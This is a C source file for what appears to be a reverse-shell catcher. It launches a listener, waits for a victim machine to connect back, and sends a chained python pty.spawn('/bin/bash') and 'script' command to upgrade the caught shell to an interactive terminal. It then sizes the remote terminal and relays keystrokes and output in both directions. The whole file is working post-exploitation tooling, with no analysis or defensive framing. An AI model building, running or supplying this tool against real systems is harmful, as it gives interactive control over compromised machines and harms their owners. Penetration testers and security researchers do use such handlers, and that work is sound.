#include "term.c"

#define SPAWN_CMD \
    "python3 -c \"import pty; pty.spawn('/bin/bash')\" 2>/dev/null" \
    " || python2 -c \"import pty; pty.spawn('/bin/bash')\" 2>/dev/null" \
    " || python  -c \"import pty; pty.spawn('/bin/bash')\" 2>/dev/null" \
    " || script -qc /bin/bash /dev/null; exit\n"

static void send_cmd(int fd, const char *s) {
    write(fd, s, strlen(s));
}

static void wait_drain(int fd_recv, int wait_ms, int show) {
    char buf[4096];
    int n;
    fd_set fds;
    struct timeval tv;
    int slices = wait_ms / 100;

    for (int i = 0; i < slices; i++) {
        tv.tv_sec = 0; tv.tv_usec = 100000;
        FD_ZERO(&fds);
        FD_SET(fd_recv, &fds);
        if (select(fd_recv + 1, &fds, NULL, NULL, &tv) > 0) {
            n = read(fd_recv, buf, sizeof(buf));
            if (n <= 0) return;
            if (show) write(STDOUT_FILENO, buf, n);
        }
    }
}

void start_session(char *listener_argv[], int listener_argc, char ssh_flag) {
    term_save();
    atexit(term_restore);
    term_install_safety();
    signal(SIGCHLD, SIG_IGN);

    int pipe_to_listener[2];
    int pipe_from_listener[2];

    if (pipe(pipe_to_listener) < 0) { perror("pipe"); return; }
    if (pipe(pipe_from_listener) < 0) { perror("pipe"); return; }

    int pid = fork();
    if (pid < 0) { perror("fork"); return; }

    if (pid == 0) {
        close(pipe_to_listener[1]);
        close(pipe_from_listener[0]);

        dup2(pipe_to_listener[0],   STDIN_FILENO);
        dup2(pipe_from_listener[1], STDOUT_FILENO);
        dup2(pipe_from_listener[1], STDERR_FILENO);

        close(pipe_to_listener[0]);
        close(pipe_from_listener[1]);

        execvp(listener_argv[0], listener_argv);
        perror("execvp");
        _exit(127);
    }

    close(pipe_to_listener[0]);
    close(pipe_from_listener[1]);

    int fd_send = pipe_to_listener[1];
    int fd_recv = pipe_from_listener[0];

    (void)listener_argc;

    char buf[4096];
    int n;

    usleep(300000);
    wait_drain(fd_recv, 500, 0);

    fprintf(stderr, "  " C_YLW "[+] waiting for connection..\n" C_RST);

    n = read(fd_recv, buf, sizeof(buf));
    if (n <= 0) { fprintf(stderr, "[-] listener died\n"); return; }
    wait_drain(fd_recv, 300, 0);

    fprintf(stderr, "  " C_YLW "[+] Inbound connection captured!\n\n" C_RST);

    term_raw();

    send_cmd(fd_send, SPAWN_CMD);
    wait_drain(fd_recv, 2000, 1);

    int rows, cols;
    term_get_size(&rows, &cols);
    char setup[256];
    snprintf(setup, sizeof(setup),
        "export TERM=xterm; stty rows %d cols %d\n", rows, cols);
    send_cmd(fd_send, setup);
    wait_drain(fd_recv, 500, 0);
    wait_drain(fd_recv, 200, 1);

    fd_set fds;
    for (;;) {
        FD_ZERO(&fds);
        FD_SET(STDIN_FILENO, &fds);
        FD_SET(fd_recv, &fds);

        int maxfd = fd_recv > STDIN_FILENO ? fd_recv : STDIN_FILENO;

        int ret = select(maxfd + 1, &fds, NULL, NULL, NULL);
        if (ret < 0) {
            if (errno == EINTR) continue;
            break;
        }

        if (FD_ISSET(STDIN_FILENO, &fds)) {
            n = read(STDIN_FILENO, buf, sizeof(buf));
            if (n <= 0) break;
            write(fd_send, buf, n);
        }

        if (FD_ISSET(fd_recv, &fds)) {
            n = read(fd_recv, buf, sizeof(buf));
            if (n <= 0) break;
            write(STDOUT_FILENO, buf, n);
        }
    }

    term_restore();

    if (ssh_flag) { } // doin later..
}